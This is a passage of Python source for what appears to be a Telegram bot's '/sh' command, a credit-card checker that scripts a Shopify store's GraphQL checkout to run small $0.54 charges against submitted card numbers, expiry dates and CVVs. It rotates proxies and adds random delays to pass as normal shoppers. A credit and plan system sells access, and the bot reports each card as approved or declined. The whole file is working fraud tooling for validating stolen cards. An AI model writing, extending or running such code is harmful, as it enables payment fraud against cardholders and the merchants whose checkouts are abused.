                "deliveryExpectations": {
                    "deliveryExpectationLines": []
                },
                "merchandise": {
                    "merchandiseLines": [{
                        "stableId": self.stable_id,
                        "merchandise": {
                            "productVariantReference": {
                                "id": f"gid://shopify/ProductVariantMerchandise/{self.variant_id}",
                                "variantId": f"gid://shopify/ProductVariant/{self.variant_id}",
                                "properties": [],
                                "sellingPlanId": None,
                                "sellingPlanDigest": None
                            }
                        },
                        "quantity": {
                            "items": {"value": 5}
                        },
                        "expectedTotalPrice": {
                            "value": {"amount": "0.50", "currencyCode": "USD"}
                        },
                        "lineComponentsSource": None,
                        "lineComponents": []
                    }]
                },
                "memberships": {"memberships": []},
                "payment": {
                    "totalAmount": {"any": True},
                    "paymentLines": [{
                        "paymentMethod": {
                            "directPaymentMethod": {
                                "paymentMethodIdentifier": self.payment_method_identifier,
                                "sessionId": payment_session_id,
                                "billingAddress": {
                                    "streetAddress": {
                                        "address1": self.address["address1"],
                                        "address2": self.address["address2"],
                                        "city": self.address["city"],
                                        "countryCode": self.address["countryCode"],
                                        "postalCode": self.address["zip"],
                                        "firstName": self.first_name,
                                        "lastName": self.last_name,
                                        "zoneCode": self.address["provinceCode"],
                                        "phone": ""
                                    }
                                },
                                "cardSource": None
                            },
                            "giftCardPaymentMethod": None,
                            "redeemablePaymentMethod": None,
                            "walletPaymentMethod": None,
                            "walletsPlatformPaymentMethod": None,
                            "localPaymentMethod": None,
                            "paymentOnDeliveryMethod": None,
                            "paymentOnDeliveryMethod2": None,
                            "manualPaymentMethod": None,
                            "customPaymentMethod": None,
                            "offsitePaymentMethod": None,
                            "customOnsitePaymentMethod": None,
                            "deferredPaymentMethod": None,
                            "customerCreditCardPaymentMethod": None,
                            "paypalBillingAgreementPaymentMethod": None,
                            "remotePaymentInstrument": None
                        },
                        "amount": {
                            "value": {
                                "amount": "0.54",
                                "currencyCode": "USD"
                            }
                        }
                    }],
                    "billingAddress": {
                        "streetAddress": {
                            "address1": self.address["address1"],
                            "address2": self.address["address2"],
                            "city": self.address["city"],
                            "countryCode": self.address["countryCode"],
                            "postalCode": self.address["zip"],
                            "firstName": self.first_name,
                            "lastName": self.last_name,
                            "zoneCode": self.address["provinceCode"],
                            "phone": ""
                        }
                    },
                    "creditCardBin": credit_card_bin
                },
                "buyerIdentity": {
                    "customer": {
                        "presentmentCurrency": "USD",
                        "countryCode": "US"
                    },
                    "email": self.email,
                    "emailChanged": False,
                    "phoneCountryCode": "US",
                    "marketingConsent": [{
                        "email": {"consentState": "DECLINED", "value": self.email}
                    }],
                    "shopPayOptInPhone": {"countryCode": "US"},
                    "rememberMe": False
                },
                "tip": {"tipLines": []},
                "taxes": {
                    "proposedAllocations": None,
                    "proposedTotalAmount": {"value": {"amount": "0.04", "currencyCode": "USD"}},
                    "proposedTotalIncludedAmount": None,
                    "proposedMixedStateTotalAmount": None,
                    "proposedExemptions": []
                },
                "note": {"message": None, "customAttributes": [
                    {"key": "DDM Delivery Type", "value": "Shipping"},
                    {"key": "No-contact Delivery", "value": "No"}
                ]},
                "localizationExtension": {"fields": []},
                "nonNegotiableTerms": None,
                "scriptFingerprint": {
                    "signature": None,
                    "signatureUuid": None,
                    "lineItemScriptChanges": [],
                    "paymentScriptChanges": [],
                    "shippingScriptChanges": []
                },
                "optionalDuties": {"buyerRefusesDuties": False},
                "cartMetafields": []
            },
            "attemptToken": attempt_token,
            "metafields": [],
            "analytics": {
                "requestUrl": f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us",
                "pageId": self.generate_uuid().upper()
            }
        }
        
        payload = {
            "operationName": "SubmitForCompletion",
            "variables": variables,
            "id": self.submit_id
        }
        
        try:
            resp = await self.client.post(
                graphql_url + "?operationName=SubmitForCompletion",
                headers=graphql_headers,
                json=payload,
                timeout=30
            )
            
            if resp.status_code != 200:
                return False, f"Submit failed: {resp.status_code}"
            
            try:
                submit_resp = resp.json()
                
                if 'errors' in submit_resp and submit_resp['errors']:
                    error_msgs = []
                    for error in submit_resp['errors']:
                        error_code = error.get('code', 'UNKNOWN')
                        error_msgs.append(error_code)
                    return False, f"DECLINED - {', '.join(error_msgs[:3])}"
                
                data = submit_resp.get('data', {}).get('submitForCompletion', {})
                receipt = data.get('receipt', {})
                self.receipt_id = receipt.get('id')
                
                if not self.receipt_id:
                    return False, "DECLINED - No receipt ID"
                
                self.logger.data_extracted("Receipt ID", self.receipt_id.split('/')[-1], "Submit")
                
                receipt_type = receipt.get('__typename', '')
                
                if receipt_type == 'ProcessingReceipt':
                    poll_delay = receipt.get('pollDelay', 500) / 1000
                    self.step(12, "POLL RECEIPT", f"Waiting {poll_delay}s", f"Delay: {poll_delay}s", "WAIT")
                    await asyncio.sleep(poll_delay)
                    return await self.poll_receipt(graphql_headers)
                    
                elif receipt_type == 'ProcessedReceipt':
                    return True, "ORDER_PLACED"
                    
                elif receipt_type == 'ActionRequiredReceipt':
                    return False, "ACTIONREQUIREDRECEIPT"
                    
                elif receipt_type == 'FailedReceipt':
                    error_info = receipt.get('processingError', {})
                    error_code = error_info.get('code', 'GENERIC_ERROR')
                    return False, f"DECLINED - {error_code}"
                    
                else:
                    return False, f"Unknown receipt: {receipt_type}"
                    
            except Exception as e:
                return False, f"Submit parse error: {str(e)[:50]}"
                
        except httpx.ProxyError as e:
            self.logger.error_log("PROXY", f"Submit proxy: {str(e)}")
            mark_proxy_failed(self.proxy_url)
            self.proxy_status = "Dead 🚫"
            return False, "PROXY_DEAD"
        except httpx.TimeoutException as e:
            self.logger.error_log("TIMEOUT", f"Submit timeout: {str(e)}")
            return False, "TIMEOUT"
        except Exception as e:
            self.logger.error_log("SUBMIT", str(e))
            return False, f"Submit error: {str(e)[:50]}"

    async def poll_receipt(self, headers, max_polls=5):
        """Step 12: Poll for receipt"""
        self.step(12, "POLL RECEIPT", "Polling for payment status")
        
        graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
        poll_attempts = 0
        max_attempts = max_polls
        base_delay = 0.5
        
        while poll_attempts < max_attempts:
            poll_attempts += 1
            
            try:
                poll_variables = {
                    "receiptId": self.receipt_id,
                    "sessionToken": self.graphql_session_token
                }
                
                poll_params = {
                    'operationName': 'PollForReceipt',
                    'variables': json.dumps(poll_variables),
                    'id': self.poll_id
                }
                
                resp = await self.client.get(
                    graphql_url,
                    headers={**headers, 'accept': 'application/json'},
                    params=poll_params,
                    timeout=30
                )
                
                if resp.status_code != 200:
                    poll_payload = {
                        "operationName": "PollForReceipt",
                        "variables": poll_variables,
                        "id": self.poll_id
                    }
                    resp = await self.client.post(
                        graphql_url + "?operationName=PollForReceipt",
                        headers=headers,
                        json=poll_payload,
                        timeout=30
                    )
                
                if resp.status_code != 200:
                    if poll_attempts < max_attempts:
                        await asyncio.sleep(base_delay * poll_attempts)
                        continue
                    return False, f"Poll failed: {resp.status_code}"
                
                try:
                    poll_resp = resp.json()
                    receipt_data = poll_resp.get('data', {}).get('receipt', {})
                    receipt_type = receipt_data.get('__typename', '')
                    
                    if receipt_type == 'FailedReceipt':
                        error_info = receipt_data.get('processingError', {})
                        error_code = error_info.get('code', 'GENERIC_ERROR')
                        return False, f"DECLINED - {error_code}"
                        
                    elif receipt_type == 'ProcessedReceipt':
                        return True, "ORDER_PLACED"
                        
                    elif receipt_type == 'ActionRequiredReceipt':
                        return False, "ACTIONREQUIREDRECEIPT"
                        
                    elif receipt_type == 'ProcessingReceipt':
                        if poll_attempts < max_attempts:
                            poll_delay = receipt_data.get('pollDelay', 500) / 1000
                            wait_time = max(poll_delay, base_delay * poll_attempts)
                            await asyncio.sleep(wait_time)
                            continue
                        else:
                            return False, "DECLINED - PROCESSING_TIMEOUT"
                    
                    else:
                        if poll_attempts < max_attempts:
                            await asyncio.sleep(base_delay)
                            continue
                        return False, f"Unknown: {receipt_type}"
                        
                except Exception as e:
                    if poll_attempts < max_attempts:
                        await asyncio.sleep(base_delay)
                        continue
                    return False, f"Poll parse error: {str(e)[:50]}"
                    
            except Exception as e:
                if poll_attempts < max_attempts:
                    await asyncio.sleep(base_delay)
                    continue
                return False, f"Poll error: {str(e)[:50]}"
        
        return False, "DECLINED - TIMEOUT"

    async def execute_checkout(self, cc, mes, ano, cvv):
        """Main checkout execution flow - MATCHING CAPTURED TRAFFIC"""
        try:
            self.step(0, "GET PROXY", "Getting proxy")
            
            if PROXY_SYSTEM_AVAILABLE:
                self.proxy_url = get_proxy_for_user(self.user_id, "random")
                if not self.proxy_url:
                    self.logger.error_log("NO_PROXY", "No working proxies available")
                    return False, "NO_PROXY_AVAILABLE"
                
                self.client = httpx.AsyncClient(proxy=self.proxy_url, timeout=30, follow_redirects=True, cookies=self.cookie_jar)
                self.proxy_status = "Live ⚡️"
                self.logger.data_extracted("Proxy", f"{self.proxy_url[:30]}...", "Proxy System")
            else:
                self.proxy_status = "No Proxy"
                self.client = httpx.AsyncClient(timeout=30, follow_redirects=True, cookies=self.cookie_jar)
            
            # Step 1: Visit homepage for cookies
            success, result = await self.visit_homepage()
            if not success:
                return False, result
            await self.random_delay(0.3, 0.5)
            
            # Step 2: Visit product page
            success, result = await self.visit_product_page()
            if not success:
                return False, result
            await self.random_delay(0.3, 0.5)
            
            # Step 3: Add to cart
            success, result = await self.add_to_cart()
            if not success:
                return False, result
            await self.random_delay(0.3, 0.5)
            
            # Step 4: POST to cart for checkout redirect
            success, result = await self.go_to_cart()
            if not success:
                return False, result
            await self.random_delay(0.3, 0.5)
            
            # Step 5: GET checkout page for session token
            success, result = await self.get_checkout_page()
            if not success:
                return False, result
            await self.random_delay(0.3, 0.5)
            
            # Step 6: Submit initial proposal
            success, result = await self.submit_proposal()
            if not success:
                return False, result
            await self.random_delay(0.3, 0.5)
            
            # Step 7: Update contact with email
            success, result = await self.update_contact_info()
            if not success:
                return False, result
            await self.random_delay(0.3, 0.5)
            
            # Step 8: Select pickup delivery
            success, result = await self.select_pickup_delivery()
            if not success:
                return False, result
            await self.random_delay(0.3, 0.5)
            
            # Step 9: Create PCI payment session
            success, payment_session_id = await self.create_payment_session(cc, mes, ano, cvv)
            if not success:
                return False, payment_session_id
            await self.random_delay(0.3, 0.5)
            
            # Step 10: Update billing address with creditCardBin
            success, result = await self.update_billing_address(payment_session_id, cc)
            if not success:
                return False, result
            await self.random_delay(0.3, 0.5)
            
            # Step 11: Submit for completion with creditCardBin
            success, result = await self.submit_for_completion(payment_session_id, cc)
            
            return success, result
            
        except Exception as e:
            self.logger.error_log("UNKNOWN", f"Checkout error: {str(e)}")
            return False, f"Checkout error: {str(e)[:50]}"
        finally:
            if self.client:
                await self.client.aclose()
            if self.pci_client:
                await self.pci_client.aclose()


# ========== MAIN CHECKER CLASS ==========
class ShopifyTaffyChecker:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.logger = ShopifyLogger(user_id)
        self.proxy_status = "Dead 🚫"

    async def check_card(self, card_details, username, user_data):
        start_time = time.time()

        self.logger = ShopifyLogger(self.user_id)
        self.logger.start_check(card_details)

        try:
            parsed = parse_card_input(card_details)
            if not parsed:
                elapsed_time = time.time() - start_time
                return format_shopify_response("", "", "", "", "Invalid card format", elapsed_time, username, user_data, self.proxy_status)

            cc, mes, ano, cvv = parsed

            if not cc.isdigit() or len(cc) < 15:
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid card number", elapsed_time, username, user_data, self.proxy_status)

            if not mes.isdigit() or len(mes) not in [1, 2] or not (1 <= int(mes) <= 12):
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid month", elapsed_time, username, user_data, self.proxy_status)

            if not ano.isdigit() or len(ano) not in [2, 4]:
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid year", elapsed_time, username, user_data, self.proxy_status)

            if not cvv.isdigit() or len(cvv) not in [3, 4]:
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid CVV", elapsed_time, username, user_data, self.proxy_status)

            self.logger.card_details_log(cc, mes, ano, cvv)

            checker = ShopifyTaffyCheckout(self.user_id)
            success, result = await checker.execute_checkout(cc, mes, ano, cvv)
            
            self.proxy_status = checker.proxy_status

            elapsed_time = time.time() - start_time

            if success:
                self.logger.complete_result(True, "APPROVED", result, elapsed_time)
            else:
                self.logger.complete_result(False, "DECLINED", result, elapsed_time)

            return format_shopify_response(cc, mes, ano, cvv, result, elapsed_time, username, user_data, self.proxy_status)

        except Exception as e:
            elapsed_time = time.time() - start_time
            self.logger.error_log("UNKNOWN", str(e))
            try:
                cc = parsed[0] if 'parsed' in locals() else ""
                mes = parsed[1] if 'parsed' in locals() else ""
                ano = parsed[2] if 'parsed' in locals() else ""
                cvv = parsed[3] if 'parsed' in locals() else ""
            except:
                cc = mes = ano = cvv = ""
            error_msg = str(e)
            if ":" in error_msg:
                error_msg = error_msg.split(":")[0].strip()
            return format_shopify_response(cc, mes, ano, cvv, f"UNKNOWN_ERROR: {error_msg[:30]}", elapsed_time, username, user_data, self.proxy_status)


# ========== COMMAND HANDLER ==========
@Client.on_message(filters.command(["sh", ".sh", "$sh"]))
@auth_and_free_restricted
async def handle_shopify_taffy(client: Client, message: Message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or str(user_id)

        command_text = message.text.split()[0]
        command_name = command_text.lstrip('/.$')

        if is_command_disabled(command_name):
            await message.reply(get_command_offline_message(command_text))
            return

        if is_user_banned(user_id):
            await message.reply("""<pre>⚠️ User Banned</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: You have been banned from using this bot.
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        users = load_users()
        user_id_str = str(user_id)
        if user_id_str not in users:
            await message.reply("""<pre>📝 Registration Required</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: You need to register first with /register
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        user_data = users[user_id_str]
        user_plan = user_data.get("plan", {})
        plan_name = user_plan.get("plan", "Free")

        can_use, wait_time = check_cooldown(user_id, "so")
        if not can_use:
            await message.reply(f"""<pre>⏱️ Cooldown Active</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Please wait {wait_time:.1f} seconds before using this command again.
🠪 <b>Your Plan:</b> <code>{plan_name}</code>
🠪 <b>Anti-Spam:</b> <code>{user_plan.get('antispam', 15)}s</code>
━━━━━━━━━━━━━""")
            return

        args = message.text.split()
        if len(args) < 2:
            await message.reply("""<pre>#WAYNE ━[SHOPIFY CHARGE 0.54$]━━</pre>
━━━━━━━━━━━━━
🠪 <b>Command</b>: <code>/sh</code>
🠪 <b>Usage</b>: <code>/sh cc|mm|yy|cvv</code> (or any format)
🠪 <b>Example</b>: <code>/sh 4111111111111111|12|2030|123</code>
━━━━━━━━━━━━━
<b>~ Note:</b> <code>Shopify Charge</code>""")
            return

        full_text = message.text
        command_parts = full_text.split(maxsplit=1)
        if len(command_parts) < 2:
            await message.reply("Please provide card details")
            return
        
        card_input = command_parts[1].strip()

        parsed = parse_card_input(card_input)
        if not parsed:
            await message.reply("""<pre>❌ Invalid Format</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Could not extract card details.
🠪 <b>Format 1</b>: <code>cc|mm|yy|cvv</code>
━━━━━━━━━━━━━""")
            return

        cc, mes, ano, cvv = parsed

        processing_msg = await message.reply(
            f"""
<b>[#Shopify Charge 0.54$] | WAYNE</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card</b>- <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway</b> - <b>Shopify Charge 0.54$</b>
<b>[•] Status</b>- <code>Processing...</code>
<b>[•] Response</b>- <code>Initiating...</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Plan:</b> {plan_name}
<b>[+] User:</b> @{username}
━━━━━━━━━━━━━━━
<b>Processing... Please wait.</b>
"""
        )

        checker = ShopifyTaffyChecker(user_id)

        if CHARGE_PROCESSOR_AVAILABLE and charge_processor:
            try:
                result = await charge_processor.execute_charge_command(
                    user_id,
                    checker.check_card,
                    card_input,
                    username,
                    user_data,
                    credits_needed=2,
                    command_name="so",
                    gateway_name="Shopify Charge 0.54$"
                )

                if isinstance(result, tuple) and len(result) == 3:
                    success, result_text, credits_deducted = result
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)
                elif isinstance(result, str):
                    await processing_msg.edit_text(result, disable_web_page_preview=True)
                else:
                    result_text = await checker.check_card(card_input, username, user_data)
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)

            except Exception as e:
                print(f"❌ Charge processor error: {str(e)}")
                try:
                    result_text = await checker.check_card(card_input, username, user_data)
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)
                except Exception as inner_e:
                    await processing_msg.edit_text(
                        f"""<pre>❌ Processing Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Error processing Shopify charge.
🠪 <b>Error</b>: <code>{str(inner_e)[:100]}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━"""
                    )
        else:
            try:
                result_text = await checker.check_card(card_input, username, user_data)
                await processing_msg.edit_text(result_text, disable_web_page_preview=True)
            except Exception as e:
                await processing_msg.edit_text(
                    f"""<pre>❌ Processing Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Error processing Shopify charge.
🠪 <b>Error</b>: <code>{str(e)[:100]}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━"""
                )

    except Exception as e:
        error_msg = str(e)[:150]
        await message.reply(f"""<pre>❌ Command Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: An error occurred while processing your request.
🠪 <b>Error</b>: <code>{error_msg}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
